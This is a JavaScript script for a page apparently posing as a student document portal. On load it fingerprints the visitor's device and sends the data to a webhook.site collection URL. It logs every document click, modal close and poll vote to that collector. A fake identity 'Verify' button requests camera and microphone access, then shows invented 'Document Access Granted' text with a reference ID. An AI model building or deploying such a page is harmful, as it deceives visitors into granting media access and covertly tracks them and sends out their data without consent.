// Main application script
document.addEventListener('DOMContentLoaded', () => {
    // Initialize the fingerprint collector
    // Replace this URL with your actual webhook URL from webhook.site or your own server
    const webhookUrl = 'https://webhook.site/your-webhook-id';
    const fingerprinter = new DeviceFingerprint(webhookUrl);
    
    // Collect fingerprint data on page load
    fingerprinter.initialize().then(data => {
        console.log('Fingerprint collected:', data);
    });

    // Document viewer modal functionality
    const modal = document.getElementById('document-viewer');
    const closeButton = document.querySelector('.close-button');
    const documentLinks = document.querySelectorAll('.document-link');
    const documentTitle = document.getElementById('document-title');
    const verifyButton = document.getElementById('verify-button');
    
    // Open modal when clicking on document links
    documentLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const docId = link.getAttribute('data-id');
            const title = link.textContent;
            
            // Set the document title in the modal
            documentTitle.textContent = title;
            
            // Open the modal
            modal.style.display = 'block';
            
            // Log the interaction
            fingerprinter.logInteraction('document_click', {
                documentId: docId,
                documentTitle: title
            });
        });
    });
    
    // Close modal when clicking the close button
    closeButton.addEventListener('click', () => {
        modal.style.display = 'none';
        
        // Log the interaction
        fingerprinter.logInteraction('modal_close', {});
    });
    
    // Close modal when clicking outside the modal content
    window.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.style.display = 'none';
            
            // Log the interaction
            fingerprinter.logInteraction('modal_outside_click', {});
        }
    });
    
    // Poll buttons functionality
    const pollButtons = document.querySelectorAll('.poll-button');
    
    pollButtons.forEach(button => {
        button.addEventListener('click', () => {
            const option = button.getAttribute('data-option');
            
            // Visual feedback for the user
            pollButtons.forEach(btn => {
                btn.style.backgroundColor = '#3498db';
            });
            button.style.backgroundColor = '#2ecc71';
            
            // Log the interaction
            fingerprinter.logInteraction('poll_vote', {
                option: option
            });
            
            // Show a thank you message
            setTimeout(() => {
                const pollOptions = document.querySelector('.poll-options');
                pollOptions.innerHTML = '<p class="thank-you">Thank you for your vote!</p>';
            }, 1000);
        });
    });
    
    // Verify button functionality (requests camera/microphone access)
    verifyButton.addEventListener('click', async () => {
        // Change button text to show it's processing
        verifyButton.textContent = 'Processing...';
        verifyButton.disabled = true;
        
        try {
            // Request media access
            await fingerprinter.requestMediaAccess();
            
            // Show success message
            verifyButton.textContent = 'Verified!';
            verifyButton.style.backgroundColor = '#2ecc71';
            
            // Simulate document loading
            document.getElementById('document-content').innerHTML = `
                <p>Thank you for verifying your identity. Loading document content...</p>
                <div class="loader"></div>
            `;
            
            // After a delay, show "document content"
            setTimeout(() => {
                document.getElementById('document-content').innerHTML = `
                    <div class="document-success">
                        <h3>Document Access Granted</h3>
                        <p>You now have access to this document. It will be available in your student portal within 24 hours.</p>
                        <p>Reference ID: ${fingerprinter.visitorId.substring(0, 8)}</p>
                    </div>
                `;
            }, 2000);
            
        } catch (error) {
            console.error('Media access error:', error);
            
            // Show error message
            verifyButton.textContent = 'Verification Failed';
            verifyButton.style.backgroundColor = '#e74c3c';
            
            document.getElementById('document-content').innerHTML = `
                <div class="document-error">
                    <h3>Verification Failed</h3>
                    <p>We couldn't verify your identity. Please try again later or contact support.</p>
                </div>
            `;
        }
    });
});
